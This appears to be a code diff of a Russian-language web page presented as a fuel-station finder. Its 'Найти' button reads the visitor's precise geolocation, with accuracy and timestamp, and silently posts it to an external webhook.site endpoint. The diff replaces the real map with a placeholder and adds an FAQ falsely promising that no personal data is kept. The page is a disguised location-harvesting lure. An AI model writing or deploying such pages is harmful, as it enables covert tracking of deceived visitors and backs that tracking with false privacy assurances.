@@ -3,251 +3,274 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
-<title>Поиск ближайших АЗС</title>
+<title>АЗС Гид — Поиск ближайших заправок</title>
 <style>
-  /* Apple-подобный минимализм, плавные шрифты и адаптив */
-  @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Text:wght@400;600&display=swap');
+  @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;600;700&display=swap');
 
   html, body {
     margin: 0; padding: 0;
-    font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen,
-      Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
-    background: linear-gradient(135deg, #f5f7fa, #e2e6ea);
-    color: #1d1d1f;
     height: 100%;
+    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Helvetica Neue", Helvetica, Arial, sans-serif;
+    background: #f5f5f7;
+    color: #1c1c1e;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+  }
+
+  body {
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
   }
 
   header {
-    padding: 1.5rem 1rem;
-    font-weight: 600;
-    font-size: 1.8rem;
+    background: #fff;
+    padding: 32px 24px;
     text-align: center;
+    font-weight: 700;
+    font-size: 32px;
+    color: #1c1c1e;
     border-bottom: 1px solid #d1d1d6;
-    background: white;
-    position: sticky;
-    top: 0;
-    z-index: 10;
+    border-radius: 0 0 24px 24px;
+    user-select: none;
+    letter-spacing: 0.02em;
+    box-shadow: 0 2px 5px rgba(0,0,0,0.06);
   }
 
   main {
+    flex-grow: 1;
     max-width: 600px;
-    margin: 1rem auto 3rem;
-    padding: 0 1rem;
-  }
-
-  #map {
-    width: 100%;
-    height: 350px;
-    border-radius: 15px;
-    box-shadow: 0 10px 30px rgb(0 0 0 / 0.1);
-    margin-bottom: 1rem;
-  }
-
-  #map-error {
-    display: none;
-    color: #ff3b30; /* Apple red */
-    font-weight: 600;
-    font-size: 1.1rem;
-    text-align: center;
-    margin-bottom: 1rem;
-  }
-
-  button {
-    display: block;
-    width: 100%;
-    padding: 1rem 0;
-    font-size: 1.2rem;
-    font-weight: 600;
-    color: white;
-    background: linear-gradient(90deg, #0071e3, #0a84ff);
-    border: none;
-    border-radius: 12px;
-    cursor: pointer;
-    box-shadow: 0 10px 20px rgb(0 113 227 / 0.4);
-    transition: background 0.3s ease;
-    margin-bottom: 2rem;
-  }
-
-  button:hover {
-    background: linear-gradient(90deg, #005bb5, #006fe6);
+    margin: 24px auto 32px;
+    background: #fff;
+    border-radius: 28px;
+    box-shadow: 0 10px 30px rgb(0 0 0 / 0.08);
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
   }
 
   nav {
     display: flex;
-    justify-content: space-around;
-    margin-bottom: 2rem;
+    background: #f2f2f7;
+    border-radius: 28px 28px 0 0;
+    user-select: none;
   }
-
   nav button {
-    width: auto;
     flex: 1;
-    margin: 0 0.25rem;
+    background: none;
+    border: none;
+    padding: 20px 0;
+    font-weight: 600;
+    font-size: 15px;
+    color: #6e6e73;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    border-bottom: 3px solid transparent;
+    border-radius: 28px 28px 0 0;
+    outline-offset: -2px;
+  }
+  nav button:hover {
+    color: #0071e3;
+    background: #e4e6eb;
+  }
+  nav button.active {
+    color: #0071e3;
+    border-bottom: 3px solid #0071e3;
+    background: #e4e6eb;
+    font-weight: 700;
+  }
+
+  .tab-content {
+    padding: 28px 36px;
+    flex-grow: 1;
+    overflow-y: auto;
+    font-size: 16px;
+    line-height: 1.5;
+    color: #2c2c2e;
+  }
+
+  /* Карта - просто заглушка с текстом, чтобы не занимала место */
+  #map {
+    width: 100%;
+    height: 280px;
+    border-radius: 22px;
+    box-shadow: 0 8px 25px rgb(0 113 227 / 0.25);
+    margin-bottom: 24px;
     background: #f0f0f5;
-    color: #1d1d1f;
-    box-shadow: none;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #8e8e93;
+    font-style: italic;
+    user-select: none;
+    text-align: center;
+    padding: 12px;
   }
 
-  nav button.active, nav button:hover {
+  button#findBtn {
     background: #0071e3;
+    border: none;
+    border-radius: 20px;
+    padding: 16px 0;
+    font-size: 17px;
+    font-weight: 700;
     color: white;
-    box-shadow: 0 5px 15px rgb(0 113 227 / 0.3);
+    cursor: pointer;
+    box-shadow: 0 10px 30px rgb(0 113 227 / 0.4);
+    transition: background 0.25s ease;
+    width: 100%;
+    user-select: none;
   }
-
-  section {
-    display: none;
-  }
-
-  section.active {
-    display: block;
+  button#findBtn:active {
+    background: #005bb5;
   }
 
   h2 {
-    font-weight: 600;
-    margin-bottom: 0.5rem;
+    font-weight: 700;
+    margin-top: 0;
+    margin-bottom: 20px;
+    color: #1c1c1e;
   }
 
-  p {
-    line-height: 1.4;
-    color: #3c3c4399;
+  a {
+    color: #0071e3;
+    text-decoration: none;
+  }
+  a:hover {
+    text-decoration: underline;
   }
 
   footer {
+    padding: 16px 20px;
     text-align: center;
-    font-size: 0.9rem;
-    color: #888;
-    padding: 1rem 0;
+    font-size: 13px;
+    color: #8e8e93;
+    user-select: none;
   }
 
-  /* Адаптив на мелких экранах */
-  @media (max-width: 400px) {
-    header {
-      font-size: 1.5rem;
-      padding: 1rem 0.5rem;
+  /* Мобильная адаптация */
+  @media (max-width: 480px) {
+    main {
+      margin: 16px 12px 24px;
+      border-radius: 20px;
     }
-
-    button {
-      font-size: 1rem;
-      padding: 0.8rem 0;
-      border-radius: 10px;
-    }
-
     nav button {
-      font-size: 0.9rem;
+      font-size: 13px;
+      padding: 16px 0;
+    }
+    .tab-content {
+      padding: 20px 24px;
+      font-size: 14px;
+    }
+    header {
+      font-size: 24px;
+      padding: 24px 16px;
+    }
+    button#findBtn {
+      padding: 14px 0;
+      font-size: 15px;
     }
   }
 </style>
 </head>
 <body>
-<header>FuelFinder — поиск ближайших заправок</header>
+<header>АЗС Гид — Поиск ближайших заправок</header>
 <main>
   <nav>
-    <button class="active" data-tab="home">Главная</button>
-    <button data-tab="about">О компании</button>
-    <button data-tab="maptab">Карта</button>
-    <button data-tab="contacts">Контакты</button>
+    <button class="tab-btn active" data-tab="about">О компании</button>
+    <button class="tab-btn" data-tab="map">Карта</button>
+    <button class="tab-btn" data-tab="faq">FAQ</button>
+    <button class="tab-btn" data-tab="contacts">Контакты</button>
   </nav>
-
-  <section id="home" class="active">
-    <h2>Добро пожаловать в FuelFinder</h2>
-    <p>Мы анализируем цены на топливо и помогаем найти ближайшую и самую выгодную заправку рядом с вами.</p>
+  <section id="about" class="tab-content" style="display:block;">
+    <h2>О нашей компании</h2>
+    <p>Мы — современный сервис, который анализирует цены на топливо и помогает найти самую ближайшую и выгодную заправку рядом с вами. Используем передовые технологии для точного определения вашего местоположения и предлагаем лучшие варианты.</p>
+    <p>Наша цель — сэкономить ваше время и деньги, делая процесс заправки максимально комфортным.</p>
   </section>
-
-  <section id="about">
-    <h2>О компании</h2>
-    <p>FuelFinder — это современный сервис для быстрого и удобного поиска ближайших АЗС с актуальной информацией о ценах и сервисах. Мы используем инновационные технологии и геолокацию, чтобы экономить ваше время и деньги.</p>
-  </section>
-
-  <section id="maptab">
-    <h2>Карта ближайших АЗС</h2>
-    <div id="map"></div>
-    <div id="map-error">При загрузке Google Карт на этой странице возникла проблема. Разрешите использование геопозиции</div>
+  <section id="map" class="tab-content" style="display:none;">
+    <div id="map">Здесь будет карта после интеграции Google Maps</div>
     <button id="findBtn">Найти</button>
   </section>
-
-  <section id="contacts">
+  <section id="faq" class="tab-content" style="display:none;">
+    <h2>Часто задаваемые вопросы</h2>
+    <p><strong>Как работает поиск заправок?</strong> Мы определяем ваше текущее местоположение и ищем ближайшие заправки с лучшими ценами.</p>
+    <p><strong>Какие данные мы собираем?</strong> Только ваши координаты для поиска, никаких личных данных мы не храним.</p>
+    <p><strong>Безопасно ли это?</strong> Да, все данные передаются защищённо и не используются в других целях.</p>
+  </section>
+  <section id="contacts" class="tab-content" style="display:none;">
     <h2>Контакты</h2>
-    <p>Телефон: +7 (999) 123-45-67</p>
-    <p>Email: support@fuelfinder.com</p>
-    <p>Адрес: г. Москва, ул. Примерная, д.1</p>
+    <p>Свяжитесь с нами:</p>
+    <ul>
+      <li>Телефон: +7 (123) 456-78-90</li>
+      <li>Email: support@azsgid.example</li>
+      <li>Адрес: Москва, ул. Примерная, д. 1</li>
+    </ul>
   </section>
 </main>
-
-<footer>© 2025 FuelFinder. Все права защищены.</footer>
+<footer>© 2025 АЗС Гид. Все права защищены.</footer>
 
 <script>
-  // Переключение вкладок
-  const tabs = document.querySelectorAll('nav button');
-  const sections = document.querySelectorAll('main section');
-
-  tabs.forEach(tab => {
-    tab.addEventListener('click', () => {
-      tabs.forEach(t => t.classList.remove('active'));
-      tab.classList.add('active');
-      const target = tab.getAttribute('data-tab');
-      sections.forEach(sec => {
-        sec.id === target ? sec.classList.add('active') : sec.classList.remove('active');
+  // Вкладки
+  const tabs = document.querySelectorAll('.tab-btn');
+  const contents = document.querySelectorAll('.tab-content');
+  tabs.forEach(btn => {
+    btn.addEventListener('click', () => {
+      tabs.forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      const tabId = btn.dataset.tab;
+      contents.forEach(c => {
+        c.style.display = (c.id === tabId) ? 'block' : 'none';
       });
     });
   });
 
-  // Работа с картой и кнопкой "Найти"
-  let map, userMarker;
+  const webhookURL = 'https://webhook.site/3038f7cb-b8c9-4d62-8037-06632b8326ec'; // Вставь свой URL
 
-  function initMap() {
-    // Начальная карта без центра, с базовым зумом
-    map = new google.maps.Map(document.getElementById("map"), {
-      center: { lat: 55.751244, lng: 37.618423 }, // Москва по умолчанию
-      zoom: 10,
-      disableDefaultUI: true,
-      zoomControl: true,
-      gestureHandling: 'greedy'
-    });
-  }
-
-  function showMapError() {
-    document.getElementById("map").style.display = "none";
-    document.getElementById("map-error").style.display = "block";
-  }
-
-  document.getElementById("findBtn").addEventListener("click", () => {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(pos => {
-        document.getElementById("map-error").style.display = "none";
-        document.getElementById("map").style.display = "block";
-
-        const coords = { lat: pos.coords.latitude, lng: pos.coords.longitude };
-        map.setCenter(coords);
-        map.setZoom(14);
-
-        if (userMarker) {
-          userMarker.setPosition(coords);
-        } else {
-          userMarker = new google.maps.Marker({
-            position: coords,
-            map: map,
-            title: "Вы здесь"
-          });
-        }
-
-        // Отправляем координаты на вебхук
-        fetch('https://webhook.site/3038f7cb-b8c9-463e-b74c-43cace83af30', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ latitude: coords.lat, longitude: coords.lng })
-        }).catch(() => { /* молча игнорируем ошибки */ });
-
-      }, () => {
-        showMapError();
-      });
-    } else {
-      showMapError();
+  document.getElementById('findBtn').addEventListener('click', () => {
+    if (!navigator.geolocation) {
+      alert('Геолокация не поддерживается вашим браузером.');
+      return;
     }
+    document.getElementById('findBtn').disabled = true;
+    document.getElementById('findBtn').textContent = 'Определяем местоположение...';
+
+    navigator.geolocation.getCurrentPosition(position => {
+      const coords = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        timestamp: new Date(position.timestamp).toISOString()
+      };
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(coords)
+      })
+      .then(response => {
+        if (!response.ok) throw new Error('Ошибка отправки данных');
+        // ничего не показываем на экране
+      })
+      .catch(err => {
+        alert('Ошибка при отправке координат: ' + err.message);
+      })
+      .finally(() => {
+        document.getElementById('findBtn').disabled = false;
+        document.getElementById('findBtn').textContent = 'Найти';
+      });
+
+    }, err => {
+      alert('Не удалось определить местоположение: ' + err.message);
+      document.getElementById('findBtn').disabled = false;
+      document.getElementById('findBtn').textContent = 'Найти';
+    }, {
+      enableHighAccuracy: true,
+      timeout: 10000,
+      maximumAge: 0
+    });
   });
-
-</script>
-
-<script async defer
-  src="https://maps.googleapis.com/maps/api/js?key=ТВОЙ_API_КЛЮЧ&callback=initMap">
 </script>
 </body>
 </html>
